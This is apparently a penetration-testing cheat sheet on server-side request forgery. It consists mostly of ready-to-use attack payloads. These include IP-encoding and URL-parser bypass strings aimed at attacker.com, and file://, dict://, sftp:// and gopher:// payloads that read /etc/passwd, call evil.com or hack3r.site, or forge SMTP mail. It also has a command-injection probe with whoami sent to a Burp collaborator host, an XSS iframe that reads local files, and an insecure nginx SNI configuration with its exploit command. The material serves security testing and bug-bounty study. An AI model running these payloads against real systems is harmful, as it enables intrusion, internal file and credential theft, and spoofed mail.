# SSRF (Server Side Request Forgery)
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.


# Capture SSRF
* Burpcollab
* http://pingb.in
* https://canarytokens.org/generate
* https://github.com/projectdiscovery/interactsh
* https://github.com/teknogeek/ssrf-sheriff
* https://webhook.site/#!/f97e9831-53bd-45c5-8d05-232dd08b9ed6
* http://requestrepo.com
* https://app.interactsh.com
* https://github.com/stolenusername/cowitness

# Bypass SSRF Protection

* **Encode-IP**
  
    The Burp extension Burp-Encode-IP implements IP formatting bypasses


* **Localhost**
```html
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1

```
* **Domain Parser**
```html
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ

```
* **Domain Confusion**
```html
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com

```

* **Other Confusions**

 https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/

* **Bypass via open redirect**

Read more here: https://portswigger.net/web-security/ssrf

# Protocols

* file://
```html
file:///etc/passwd

```
* dict://
```html
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/

```
* SFTP://
```html
ssrf.php?url=sftp://evil.com:11111/

```
* TFTP://
```html
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

```
* LDAP://
```html
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit

```
* Gopher://
```html
//Gopher smtp
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT

//Gopher HTTP
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body

//Gopher SMTP — Back connect to 1337
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.

```
* **Curl URL globbing - WAF bypass**
  * https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi
  * https://everything.curl.dev/cmdline/globbing

```html
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}

```

* **SSRF via Referrer header**

Some applications employ server-side analytics software that tracks visitors. This software often logs the Referrer header in requests, since this is of particular interest for tracking incoming links. Often the analytics software will actually visit any third-party URL that appears in the Referrer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.
To discover this kind of "hidden" vulnerabilities you could use the plugin "Collaborator Everywhere" from Burp.

* **SSRF via SNI data from certificate**

The simplest misconfiguration that would allow you to connect to an arbitrary backend would look something like this
```html
stream {
    server {
        listen 443; 
        resolver 127.0.0.11;
        proxy_pass $ssl_preread_server_name:443;       
        ssl_preread on;
    }
}

```
Here, the SNI field value is used directly as the address of the backend.
With this insecure configuration, we can exploit the SSRF vulnerability simply by specifying the desired IP or domain name in the SNI field. For example, the following command would force Nginx to connect to internal.host.com
```bash
openssl s_client -connecttarget.com:443 -servername "internal.host.com" -crlf

```
* **wget File Upload**

```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080

```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]


```

Note that another option you may be thinking of to bypass this check is to make the HTTP server redirect to a different file, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This won't work unless wget is being used with the parameter --trust-server-names because wget will download the redirected page with the name of the file indicated in the original URL.

* **Command Injection**

It might be worth trying a payload like:

```html
url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`

```

# Blind SSRF

* **Time based SSRF**

Checking the time of the responses from the server it might be possible to know if a resource exists or not (maybe it takes more time accessing an existing resource than accessing one that doesn't exist)

## SSRF to XSS
```html
http://brutelogic.com.br/poc.svg      //simple alert
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=      //simple ssrf

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg

```

## SSRF from XSS

**Using an iframe**

The content of the file will be integrated inside the PDF as an image or text
```javascript
<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

```

**Using an attachment**

Example of a PDF attachment using HTML

1. use `<link rel=attachment href="URL">` as Bio text
2. use `'Download Data'` feature to get PDF
3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
4. cat `attachment.bin`


# SSRF at a glance
[SSRF (Server-Side Request Forgery ).pdf](https://github.com/Mehdi0x90/Web_Hacking/files/12438160/SSRF.Server-Side.Request.Forgery.pdf)




# Tools

* https://github.com/swisskyrepo/SSRFmap
* https://github.com/tarunkant/Gopherus
* https://github.com/qtc-de/remote-method-guesser
































